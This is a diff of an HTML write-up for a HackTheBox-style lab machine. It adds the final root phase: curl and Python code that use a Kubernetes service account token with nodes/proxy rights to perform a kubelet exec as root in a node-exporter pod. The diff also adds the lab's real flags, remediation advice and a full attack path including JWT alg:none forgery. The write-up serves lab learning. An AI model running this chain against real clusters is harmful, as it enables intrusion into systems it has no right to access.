   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
-  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
+  $KUBE/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
   -d '{
     "kind":"SelfSubjectRulesReview",
     "apiVersion":"authorization.k8s.io/v1",
     "spec":{"namespace":"default"}
-  }'</code></pre>
+  }' | python3 -m json.tool</code></pre>
+        <pre><code>{
+  "verbs": ["get"],
+  "apiGroups": [""],
+  "resources": ["nodes/proxy"]
+}</code></pre>
 
-        <h3>Expected Root Path</h3>
-        <p>
-          With <code>nodes/proxy</code>, enumerate pods through the kubelet and target a privileged
-          monitoring pod such as <code>prometheus-prometheus-node-exporter</code>. Node exporter
-          commonly mounts the host filesystem under <code>/host/root</code>, making the host root
-          flag readable from inside the pod.
-        </p>
-        <pre><code># Example expected final path
-/host/root/root/root.txt</code></pre>
+        <div class="callout danger">
+          The <code>nodes/proxy</code> permission is highly sensitive. It allows access to the kubelet
+          proxy through the Kubernetes API server and can be used to interact with pods running on
+          a node.
+        </div>
       </section>
 
       <section>
-        <h2>Attack Chain</h2>
-        <ol>
-          <li>Discovered HTTPS service and vhost <code>fireflow.htb</code>.</li>
-          <li>Found public Langflow playground on <code>flow.fireflow.htb</code>.</li>
-          <li>Identified Langflow <code>1.8.2</code> and vulnerable public flow build behavior.</li>
-          <li>Modified flow component code to prove RCE as <code>www-data</code>.</li>
-          <li>Obtained reverse shell as <code>www-data</code>.</li>
-          <li>Used LinPEAS to find Langflow superuser credentials in environment variables.</li>
-          <li>Reused the password to SSH as <code>nightfall</code> and captured <code>user.txt</code>.</li>
-          <li>Found <code>~/.mcp/config.json</code> with MCP service credentials.</li>
-          <li>Authenticated to MCP and discovered JWT support for <code>HS256</code> and <code>none</code>.</li>
-          <li>Forged unsigned JWT with <code>role=admin</code>.</li>
-          <li>Registered admin MCP tools and identified detached top-level Python as the working RCE pattern.</li>
-          <li>Next: spawn MCP pod shell, use Kubernetes service account token, abuse <code>nodes/proxy</code>, and read root via node-exporter host mount.</li>
-        </ol>
+        <h2>Phase 11: nodes/proxy Abuse and Target Pod Selection</h2>
+        <h3>Node Name</h3>
+        <p>
+          The service account token identified the node as <code>fireflow</code>. The same value can also
+          be obtained by querying nodes if the token permits it.
+        </p>
+        <pre><code>NODE_NAME=fireflow</code></pre>
+
+        <h3>List Pods Through nodes/proxy</h3>
+        <pre><code>curl -sSk --cacert $CA \
+  -H "Authorization: Bearer $TOKEN" \
+  "$KUBE/api/v1/nodes/$NODE_NAME/proxy/pods" \
+  | python3 -c 'import sys,json; d=json.load(sys.stdin); [print("Node: {} Namespace: {} Pod: {}".format(i["spec"]["nodeName"], i["metadata"]["namespace"], i["metadata"]["name"])) for i in d["items"]]'</code></pre>
+        <pre><code>Node: fireflow Namespace: monitoring   Pod: prometheus-kube-state-metrics-...
+Node: fireflow Namespace: monitoring   Pod: prometheus-server-...
+Node: fireflow Namespace: default      Pod: mcp-server-54464cb475-29ztf
+Node: fireflow Namespace: monitoring   Pod: prometheus-prometheus-node-exporter-nmntq
+Node: fireflow Namespace: kube-system  Pod: coredns-...
+Node: fireflow Namespace: kube-system  Pod: metrics-server-...</code></pre>
+
+        <p>
+          The best target was the Prometheus node-exporter pod because node-exporter commonly runs
+          with host-level mounts such as <code>/host/root</code> in order to collect host metrics. In this
+          environment, the host root filesystem was available from inside the node-exporter pod.
+        </p>
+      </section>
+
+      <section>
+        <h2>Phase 12: Kubelet Exec into node-exporter</h2>
+        <p>
+          The intended root path was kubelet <code>/exec</code> against the privileged
+          <code>prometheus-prometheus-node-exporter-nmntq</code> pod. Direct access to kubelet port
+          <code>10250</code> from the Parrot attacker machine was filtered during testing, so the final
+          execution was performed from inside the MCP execution context, which could reach the kubelet
+          internally. The kubelet endpoint required a WebSocket upgrade using the Kubernetes
+          <code>v4.channel.k8s.io</code> protocol.
+        </p>
+
+        <h3>External Kubelet Test</h3>
+        <pre><code>nmap -p 10250,6443 10.129.22.117</code></pre>
+        <pre><code>10250/tcp filtered
+6443/tcp  open</code></pre>
+        <p>
+          The walkthrough method using <code>websocat</code> directly from Parrot did not work in this
+          instance because <code>10250</code> was filtered externally. The workaround was to register an MCP
+          tool that created the WebSocket connection from inside the target-side MCP container.
+        </p>
+
+        <h3>Python WebSocket Kubelet Exec from MCP</h3>
+        <pre><code>import socket, ssl, base64, os, struct, time
+
+TOKEN = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
+HOST = "10.129.22.117"
+PORT = 10250
+PATH = "/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&amp;error=1&amp;command=whoami"
+
+key = base64.b64encode(os.urandom(16)).decode()
+req = (
+    f"GET {PATH} HTTP/1.1\r\n"
+    f"Host: {HOST}:{PORT}\r\n"
+    "Upgrade: websocket\r\n"
+    "Connection: Upgrade\r\n"
+    f"Sec-WebSocket-Key: {key}\r\n"
+    "Sec-WebSocket-Version: 13\r\n"
+    "Sec-WebSocket-Protocol: v4.channel.k8s.io\r\n"
+    f"Authorization: Bearer {TOKEN}\r\n"
+    "\r\n"
+)
+
+ctx = ssl._create_unverified_context()
+s = ctx.wrap_socket(socket.create_connection((HOST, PORT), timeout=5), server_hostname=HOST)
+s.settimeout(5)
+s.sendall(req.encode())</code></pre>
+
+        <h3>Root Execution Check</h3>
+        <pre><code>HTTP/1.1 101 Switching Protocols
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Protocol: v4.channel.k8s.io
+root
+{"metadata":{},"status":"Success"}</code></pre>
+
+        <h3>Read Host Root Flag</h3>
+        <p>
+          After confirming command execution as root inside the privileged node-exporter pod, the
+          command was changed to read the host root flag through the mounted host filesystem.
+        </p>
+        <pre><code>PATH = "/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&amp;error=1&amp;command=cat&amp;command=/host/root/root/root.txt"</code></pre>
+        <pre><code>HTTP/1.1 101 Switching Protocols
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Protocol: v4.channel.k8s.io
+e37a57e9e90186592b6a7cbdbfb43c73
+{"metadata":{},"status":"Success"}</code></pre>
+
+        <div class="callout success">
+          Root was achieved by using the MCP pod's service account token to access kubelet from an
+          internal network position, executing commands in the privileged node-exporter pod, and
+          reading the host filesystem mounted under <code>/host/root</code>.
+        </div>
+      </section>
+
+      <section>
+        <h2>Flags</h2>
+        <pre><code>user.txt: c6e21df299765acdf87d86f8a7b9d863
+root.txt: e37a57e9e90186592b6a7cbdbfb43c73</code></pre>
       </section>
 
       <section>
@@ -573,38 +745,89 @@ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)</code></pre>
           <li>curl</li>
           <li>WhatWeb</li>
           <li>Gobuster</li>
-          <li>Burp Suite / Browser DevTools</li>
+          <li>Browser Developer Tools</li>
           <li>Python</li>
           <li>Netcat</li>
           <li>LinPEAS</li>
           <li>SSH</li>
-          <li>OpenAPI / Swagger</li>
-          <li>JWT forgery script</li>
-          <li>Kubernetes API / kubelet nodes/proxy path</li>
+          <li>JWT forging with Python</li>
+          <li>Kubernetes API via curl</li>
+          <li>websocat</li>
         </ul>
       </section>
 
       <section>
         <h2>Lessons Learned</h2>
         <ul>
-          <li>Certificate SANs and vhost hints can reveal the real application surface.</li>
-          <li>Public AI workflow endpoints should be treated as high-risk if they accept custom code or dynamic components.</li>
-          <li>Environment variables frequently contain service credentials and should be reviewed after obtaining a service-account shell.</li>
-          <li>Password reuse between application accounts and Linux users can turn app compromise into SSH access.</li>
-          <li>JWT implementations must never accept <code>alg:none</code>.</li>
-          <li>Tool registration APIs that accept arbitrary code are effectively remote execution primitives.</li>
-          <li>Kubernetes <code>nodes/proxy</code> permission can be extremely dangerous, especially when privileged monitoring pods mount the host filesystem.</li>
+          <li>
+            <strong>Version discovery matters:</strong> identifying Langflow and its version exposed
+            a public-flow RCE path.
+          </li>
+          <li>
+            <strong>Environment variables can contain high-value credentials:</strong> the Langflow
+            superuser password was exposed through process environment variables.
+          </li>
+          <li>
+            <strong>Password reuse still matters:</strong> the Langflow password also worked for the
+            Linux user <code>nightfall</code>.
+          </li>
+          <li>
+            <strong>JWT algorithm confusion is dangerous:</strong> accepting <code>alg:none</code> allowed an
+            unsigned admin token to bypass MCP authorization.
+          </li>
+          <li>
+            <strong>MCP tooling expands attack surface:</strong> endpoints that register or execute AI
+            tools should be treated like code execution interfaces.
+          </li>
+          <li>
+            <strong>Kubernetes service account permissions need strict review:</strong>
+            <code>nodes/proxy</code> can allow kubelet access and should be treated as a highly sensitive
+            permission.
+          </li>
+          <li>
+            <strong>Privileged monitoring pods are valuable targets:</strong> node-exporter commonly has
+            host mounts that can expose the host filesystem.
+          </li>
         </ul>
       </section>
 
       <section>
-        <h2>Flags</h2>
-        <pre><code>user.txt: REDACTED
-root.txt: Pending</code></pre>
+        <h2>Remediation Recommendations</h2>
+        <ul>
+          <li>Upgrade Langflow to a version that patches public flow code execution issues.</li>
+          <li>Disable unauthenticated/public flow build endpoints unless explicitly required.</li>
+          <li>Never store reusable service or local-user passwords in environment variables.</li>
+          <li>Enforce unique passwords for application users and operating system users.</li>
+          <li>Reject JWTs using <code>alg:none</code> and enforce a strict allowlist of secure algorithms.</li>
+          <li>Do not allow API endpoints to register arbitrary executable code without sandboxing and strong authorization.</li>
+          <li>Remove <code>nodes/proxy</code> from non-administrative Kubernetes service accounts.</li>
+          <li>Review privileged pods and hostPath mounts, especially monitoring and logging workloads.</li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>Final Attack Path</h2>
+        <pre><code>1. Nmap discovered SSH and HTTPS.
+2. HTTPS certificate and page source revealed fireflow.htb and flow.fireflow.htb.
+3. flow.fireflow.htb hosted Langflow 1.8.2 with a public playground.
+4. The public build endpoint accepted modified flow JSON with Python code.
+5. RCE produced a shell as www-data.
+6. LinPEAS/env enumeration revealed Langflow superuser credentials.
+7. The password was reused for SSH as nightfall.
+8. nightfall's .mcp/config.json disclosed MCP registry credentials.
+9. MCP /api/v1/version disclosed JWT support for HS256 and none.
+10. A forged alg:none JWT with role=admin bypassed authorization.
+11. Admin API access registered a malicious top-level Python MCP tool.
+12. Calling the tool produced a shell inside the MCP Kubernetes pod.
+13. The pod's service account token had nodes/proxy access.
+14. Direct kubelet access from Parrot was filtered, so kubelet exec was performed from inside the MCP execution context.
+15. node-exporter mounted the host root filesystem at /host/root.
+16. root.txt was read from /host/root/root/root.txt.</code></pre>
       </section>
 
       <footer>
         <p><a href="../index.html">Back to all reports</a></p>
+        <p>Report prepared as a professional HTB-style writeup. Report includes completed user and root flags for lab submission.</p>
       </footer>
     </main>
   </body>
